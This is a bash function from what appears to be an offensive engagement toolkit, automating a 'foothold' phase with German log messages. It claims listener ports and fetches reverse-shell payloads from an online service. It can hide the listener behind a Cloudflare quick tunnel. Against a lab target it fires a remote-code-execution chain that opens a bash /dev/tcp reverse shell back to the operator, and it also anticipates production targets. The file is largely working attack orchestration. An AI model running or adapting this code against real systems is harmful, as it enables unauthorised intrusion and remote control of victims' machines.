# shellcheck shell=bash
# Phase 40 — foothold: listeners + optional Cloudflare tunnel; Lab-FPM: automated
# Chain-A RCE → reverse shell into the nc listener (no manual payload copy).
# Requires ENGAGE_LHOST (operator IP reachable from target).
phase_foothold() {
  state_done 40 && { echo "[40] foothold ✓ (skip)"; return 0; }
  local lhost="${ENGAGE_LHOST:?ENGAGE_LHOST setzen (Operator-IP, vom Ziel erreichbar)}"
  local lport="${ENGAGE_LPORT:-4444}"
  lport="$(engage_claim_listen_port "$lport")" || return 1
  export ENGAGE_LPORT="$lport"
  local sid="p2s-$ENGAGE_SID"
  local paydir="$ENGAGE_DIR/payloads"
  mkdir -p "$paydir"

  rs_ensure_cloned
  local payload="$paydir/r"
  if rs_fetch_payload "$lhost" "$lport" "$payload"; then
    state_set 40 RS_PAYLOAD "$payload"
  else
    state_set 40 RS_PAYLOAD "fetch-failed"
  fi
  rs_oneliners "$lhost" "$lport" >"$paydir/oneliners.txt"

  local jobs=(
    "listener|python3 scripts/engage-listen.py $lport"
  )
  if [[ "${ENGAGE_RS:-on}" != "off" ]]; then
    local rsport="${ENGAGE_RS_PORT:-$((lport + 1))}"
    if [[ "$rsport" == "$lport" ]]; then
      rsport=$((lport + 1))
    fi
    rsport="$(engage_claim_listen_port "$rsport")" || rsport=""
    if [[ -n "$rsport" ]]; then
      jobs+=("rs-raas-$rsport|echo '[rs] lukechilds — Listener $rsport'; python3 scripts/engage-listen.py $rsport")
      state_set 40 RS_PORT "$rsport"
      rs_fetch_payload "$lhost" "$rsport" "$paydir/r-$rsport" || true
    fi
  fi

  if [[ "${ENGAGE_TUNNEL:-}" == "on" ]]; then
    local turl="http://127.0.0.1:$lport"
    if command -v cloudflared >/dev/null 2>&1; then
      jobs+=("cf-tunnel|echo '[tunnel] Quick Tunnel → $turl'; cloudflared tunnel --no-autoupdate --url $turl")
    elif command -v docker >/dev/null 2>&1; then
      jobs+=("cf-tunnel|echo '[tunnel] docker cloudflared → $turl'; docker run --rm --network host cloudflare/cloudflared:latest tunnel --no-autoupdate --url $turl")
    else
      echo "[40] WARN: ENGAGE_TUNNEL=on aber weder cloudflared noch docker" | tee -a "$ENGAGE_DIR/logs/40-tunnel.warn"
    fi
    state_set 40 TUNNEL "on"
  else
    state_set 40 TUNNEL "off"
  fi

  term_spawn_jobs "$sid" "$ENGAGE_DIR/logs" "${jobs[@]}"
  sleep 2

  state_set 40 LISTEN_HOST "$lhost"
  state_set 40 LISTEN_PORT "$lport"
  state_set 40 TERM_SESSION "$sid"

  local fh="listener-only"
  if [[ "${ENGAGE_LAB_FOOTHOLD:-auto}" != "off" ]] && engage_lab_foothold_supported; then
    local fh_log="$ENGAGE_DIR/logs/40-foothold-lab.log"
    echo "[40] Lab-Foothold: Chain-A RCE → bash /dev/tcp $lhost:$lport …" | tee "$fh_log"
    local listen_log="$ENGAGE_DIR/logs/listener.log"
    if [[ -f "$listen_log" ]] && grep -q 'FEHLER: Port' "$listen_log"; then
      state_set 40 LAB_FOOTHOLD "listener-tot"
      echo "[40] Listener ist tot (Port belegt). Siehe $listen_log" >&2
      tail -5 "$listen_log" >&2 || true
    elif engage_lab_foothold_exec_rce "$lhost" "$lport" >>"$fh_log" 2>&1; then
      sleep 1
      if [[ -f "$listen_log" ]] && grep -q 'Shell von' "$listen_log"; then
        fh="shell-da"
        state_set 40 LAB_FOOTHOLD "shell-da"
      else
        echo "[40] RCE ohne offene Shell — starte Shell direkt im Lab-Target" | tee -a "$fh_log"
        engage_lab_foothold_direct_shell "$lhost" "$lport" || true
        sleep 1
        if [[ -f "$listen_log" ]] && grep -q 'Shell von' "$listen_log"; then
          fh="shell-da"
          state_set 40 LAB_FOOTHOLD "shell-da"
        else
          fh="rce-ohne-shell"
          state_set 40 LAB_FOOTHOLD "rce-ohne-shell"
          echo "[40] Keine Shell im Listener. Log:" >&2
          tail -8 "$listen_log" >&2 || true
        fi
      fi
    else
      state_set 40 LAB_FOOTHOLD "failed"
      echo "[40] Lab-Foothold fehlgeschlagen — siehe $fh_log" >&2
    fi
    engage_lab_foothold_note | tee -a "$fh_log"
  elif engage_target_is_lab; then
    echo "[40] Lab-Ziel, aber FPM-Container/Docker nicht bereit — nur Listener+Payloads" >&2
    state_set 40 LAB_FOOTHOLD "skipped-no-target"
  else
    state_set 40 LAB_FOOTHOLD "prod-manual"
  fi

  state_set 30 FOOTHOLD "$fh"
  state_mark 40

  cat <<EOF
[40] foothold ✓ Listener: $lhost:$lport (tmux $sid, Fenster listener)
     Lab-RCE-Foothold: $(state_get 40 LAB_FOOTHOLD)
     Payloads (manuelle Referenz): $paydir/oneliners.txt
EOF
}
